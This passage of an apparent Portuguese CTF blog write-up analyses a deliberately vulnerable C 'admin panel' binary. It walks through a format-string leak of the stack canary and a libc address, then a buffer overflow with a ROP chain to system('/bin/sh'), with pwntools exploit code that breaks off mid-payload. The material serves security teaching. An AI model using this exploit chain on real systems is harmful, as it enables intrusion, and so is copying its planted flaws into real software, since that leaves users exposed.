</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>upkeep</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// IGNORE THIS
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>admin</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>choice</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>report</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Welcome to the administrator panel!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Here are your options:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;1. Display current status report&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;2. Submit error report&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;3: Perform cloning (currently disabled)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Enter either 1, 2 or 3: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>choice</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You picked: %d</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>choice</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>choice</span><span class=o>==</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Status report: </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>Administrator panel functioning as expected.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>Some people have told me that my code is insecure, but&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>fortunately, the panel has many standard security measures implemented&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>to make up for that fact.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>Currently working on implementing cloning functionality,&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>though it may be somewhat difficult (I am not a competent programmer).&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>choice</span><span class=o>==</span><span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Enter information on what went wrong:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%128s&#34;</span><span class=p>,</span> <span class=n>report</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Report submitted!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>choice</span><span class=o>==</span><span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// NOTE: Too dangerous in the wrong hands, very spooky indeed
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Sorry, this functionality has not been thoroughly tested yet! Try again later.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nf>clone</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid option!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>upkeep</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>username</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>24</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>status</span><span class=p>[</span><span class=mi>24</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;Login Successful!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Secure Login:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Enter username of length 16:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%16s&#34;</span><span class=p>,</span> <span class=n>username</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Enter password of length 24:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%44s&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Username entered: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>username</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=s>&#34;admin&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=o>||</span> <span class=nf>strncmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=s>&#34;secretpass123&#34;</span><span class=p>,</span> <span class=mi>13</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>strcpy</span><span class=p>(</span><span class=n>status</span><span class=p>,</span> <span class=s>&#34;Login failed!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Access denied to admin panel.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Exiting...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>admin</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Exiting...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Checksec do binário fornecido:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Full RELRO
</span></span><span class=line><span class=cl>    Stack:    Canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      PIE enabled
</span></span></code></pre></td></tr></table></div></div><p>Tudo está habilitado !</p><p>Eu usei o <em>pwninit</em> para gerar um arquivo patcheado que usa a <code>libc</code> e o <code>ld</code> fornecidos. Você pode conferi-lo aqui: <a href=https://github.com/io12/pwninit>pwninit</a></p><p>Ao olhar o código-fonte, há algumas coisas suspeitas&mldr;</p><ol><li><code>password</code> é um buffer de tamanho 24, mas estamos escrevendo 45 bytes nele (<code>scanf("%44s", password);</code>).</li><li>Existem dois <code>printf(status);</code>, o que pode se tornar uma vulnerabilidade de format string.</li><li><code>report</code> é um buffer de tamanho 64, mas estamos escrevendo 129 bytes nele (<code>scanf("%128s", report);</code>).</li></ol><p>Para executar a função <code>admin</code>, precisamos de um <code>username</code> com <code>admin</code> e uma <code>password</code> com <code>secretpass123</code>. Então, para o <code>username</code>, eu forneci a entrada <code>admin</code>. Mas o <code>password</code> é um buffer de tamanho 24 e podemos escrever mais coisas nele. Na verdade, podemos sobrescrever o conteúdo de <code>status</code>, que é declarado imediatamente após <code>password</code>!</p><p>Como <code>status</code> é usado dentro do <code>printf</code>, na verdade temos uma vulnerabilidade de format string. Precisamos preencher o buffer <code>password</code> + o espaço entre <code>password</code> e <code>status</code> e então começar a escrever em <code>status</code>.</p><p>Para calcular o índice passado na format string, podemos usar o gdb. Vamos inserir um ponto de interrupção logo antes do <code>printf</code> vulnerável e examinar a pilha:</p><p><img alt=admin-panel1 loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel1.png></p><p>O stack cookie (logo antes do <code>rbp</code>) está na posição 10 se começarmos a contar do topo da pilha. O <code>printf</code> começará imprimindo os registradores e depois imprimirá a pilha. Isso significa que precisamos adicionar 5 a essa contagem (resultando em 15). É importante saber o stack cookie, pois temos um buffer overflow dentro da função <code>admin</code>.</p><p>É importante notar também que temos ASLR e PIE ativados, então seria bom ter um vazamento de endereço. Felizmente, ainda podemos escrever mais coisas na entrada do password. Vamos olhar novamente a pilha e ver se conseguimos vazar algo:</p><p><img alt=admin-panel2 loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel2.png></p><p>Há um endereço logo após o <code>rbp</code>. É um endereço de retorno para <em>algum lugar</em>. Vamos descobrir para onde isso nos leva executando o comando <code>vmmap</code>.</p><p><img alt=vmmap loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel3.png></p><p>Nosso endereço é <code>0x00007ffff7e3109b</code>, e como podemos ver, isso está dentro da <code>libc</code>. Então, podemos vazar um endereço da libc. Como a posição do stack cookie é 15 e está 2 posições antes do endereço de retorno, a posição do endereço da libc será 17 quando explorarmos a vulnerabilidade da format string.</p><p>Até agora temos:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./admin-panel_patched&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;admin&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>Isso deve imprimir o stack cookie e o endereço da libc. Vamos pegar esses valores e imprimi-los na solução:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>leak_addr</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack_cookie</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak_addr</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak_addr</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;stack cookie is: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>stack_cookie</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;leaked address is: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Ótimo! O stack cookie e o endereço vazado estão salvos. O programa está agora dentro da função <code>admin()</code>. Vamos tentar explorar o estouro de buffer escolhendo a opção 2. Há uma escrita de 129 bytes no buffer de 64 bytes <code>report</code>. Se fizermos um teste, podemos verificar que realmente podemos sobrescrever o endereço de retorno (e, consequentemente, o stack cookie ;;)</p><p><img alt=stack_smashing loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel4.png></p><p>Vamos abri-lo no gdb e inserir um ponto de interrupção antes da verificação do stack cookie (<code>__stack_chk_fail@plt</code>). Estou colocando o ponto de interrupção na instrução <code>mov rdx, QWORD PTR [rbp-0x8]</code>. Vamos também usar o comando <code>pattern create</code> para gerar um padrão para nossa entrada e ver onde as coisas estão dando errado.</p><p>Isso é o que eu vejo dentro do registrador <code>rdx</code>:<br><code>$rdx : 0x616161616161616a ("jaaaaaaa"?)</code><br>(poderíamos também verificar o valor de <code>rbp-0x8</code> usando o comando <code>x/gx $rbp-0x8</code>)<br>Verificando a posição do offset:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gef➤  pattern offset 0x616161616161616a
</span></span><span class=line><span class=cl>[+] Searching for &#39;6a61616161616161&#39;/&#39;616161616161616a&#39; with period=8
</span></span><span class=line><span class=cl>[+] Found at offset 72 (little-endian search) likely
</span></span></code></pre></td></tr></table></div></div><p>Isso significa que precisamos usar a parte do padrão <code>'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa'</code> para alcançar o stack cookie. Depois disso, escrevemos o stack cookie que foi recuperado usando a vulnerabilidade de format string e escrevemos qualquer coisa no <code>rbp</code>, não importa. Depois de tudo isso, finalmente podemos escrever no endereço de retorno sem problemas.</p><p>Mas para onde retornamos?</p><p>Não temos nenhuma função interessante em nosso programa que poderia executar algo para nós. O que temos, no entanto, é um endereço da libc no endereço de retorno. Como temos PIE e ASLR ativados, esse endereço será randomizado toda vez, mas sempre será a mesma instrução. Nesse caso, precisamos apenas calcular o offset da instrução sendo executada considerando o ponto de entrada como referência. Vamos usar o gdb para alcançar isso</p><p><img alt=admin-panel5 loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel5.png></p><p>O endereço destacado é o endereço de retorno. Vamos ver para onde isso nos leva</p><p><img alt=admin-panel6 loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel6.png></p><p>Isso nos leva para <code>__libc_start_main+235</code>. Agora precisamos verificar qual é o offset dessa instrução quando o programa não está em execução. Então você pode abrir o arquivo libc dentro do gdb. Eu o abri, disassemblei a <code>__libc_start_main</code> e comecei a procurar pela instrução específica <code>__libc_start_main+235</code>.</p><p><img alt=admin-panel7 loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel7.png></p><p>Lá está :) Está no endereço <code>0x000000000002409b</code>, então está no offset <code>0x2409b</code> após o entrypoint da libc. Agora podemos usar o endereço da libc que vazamos anteriormente e subtrair <code>0x2409b</code> dele para encontrar o endereço do entrypoint da libc mesmo quando o programa está em execução!</p><p>Aqui está o cálculo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>libc_start_main_offset</span> <span class=o>=</span> <span class=mh>0x000000000002409b</span>
</span></span><span class=line><span class=cl><span class=n>libc_entrypoint</span> <span class=o>=</span> <span class=n>libc_leak</span> <span class=o>-</span> <span class=n>libc_start_main_offset</span>
</span></span></code></pre></td></tr></table></div></div><p>Agora podemos escolher qualquer endereço da libc para pular. Vamos ver se conseguimos executar a função system e passar o argumento <code>/bin/sh</code> para obter uma shell.</p><p>Procurando o offset de <code>system</code> dentro da libc:</p><p><img alt=admin-panel8 loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel8.png></p><p><code>system</code> está no offset <code>0x44af0</code>. Vamos salvar isso:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>system_offset</span> <span class=o>=</span> <span class=mh>0x44af0</span>
</span></span></code></pre></td></tr></table></div></div><p><code>"/bin/sh"</code> está no offset <code>18052c</code>:</p><p><img alt=admin-panel9 loading=lazy src=/images/davi-post-pwn/admin-panel/admin-panel9.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>bin_sh_offset</span> <span class=o>=</span> <span class=mh>0x18052c</span>
</span></span></code></pre></td></tr></table></div></div><p>Então sabemos o endereço de <code>system</code> e o endereço da string <code>"/bin/sh"</code>. No entanto, precisamos colocar a string <code>"/bin/sh"</code> no registrador <code>rdi</code> ao chamar a função <code>system</code>. Podemos conseguir isso usando ROP. Vamos procurar alguns gadgets usando <code>ROPgadget</code></p><p>O comando é: <code>ROPgadget --binary libc.so.6 --ropchain | grep "pop rdi"</code><br><code>[+] Gadget found: 0x23a5f pop rdi ; ret</code><br>Vamos também salvá-lo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_rdi_ret_offset</span> <span class=o>=</span> <span class=mh>0x23a5f</span>
</span></span></code></pre></td></tr></table></div></div><p>Ótimo! Isso é tudo o que precisamos :)</p><p>Em conclusão, estamos preenchendo todo o buffer <code>report</code>, sobrescrevendo o stack cookie, colocando qualquer coisa no registrador <code>rbp</code>, sobrescrevendo o endereço de retorno com a instrução <code>pop rdi ; ret</code> para colocar a string <code>"/bin/sh"</code> no registrador <code>rdi</code>, colocando o endereço da string <code>"/bin/sh"</code> (o entrypoint da libc + o offset que encontramos) logo depois para que <code>pop rdi</code> funcione corretamente, e então colocando o endereço de <code>system</code> (o entrypoint da libc + o endereço que encontramos) depois para que <code>ret</code> retorne para ele :)</p><p>Esta é a minha solução para este desafio:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc_start_main_offset</span> <span class=o>=</span> <span class=mh>0x000000000002409b</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret_offset</span> <span class=o>=</span> <span class=mh>0x23a5f</span>
</span></span><span class=line><span class=cl><span class=n>system_offset</span> <span class=o>=</span> <span class=mh>0x44af0</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh_offset</span> <span class=o>=</span> <span class=mh>0x18052c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./admin-panel_patched&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;admin&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak_addr</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack_cookie</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak_addr</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak_addr</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;stack cookie is: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>stack_cookie</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;leaked address is: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc_entrypoint</span> <span class=o>=</span> <span class=n>libc_leak</span> <span class=o>-</span> <span class=n>libc_start_main_offset</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>libc_entrypoint</span> <span class=o>+</span> <span class=n>pop_rdi_ret_offset</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack_cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span>
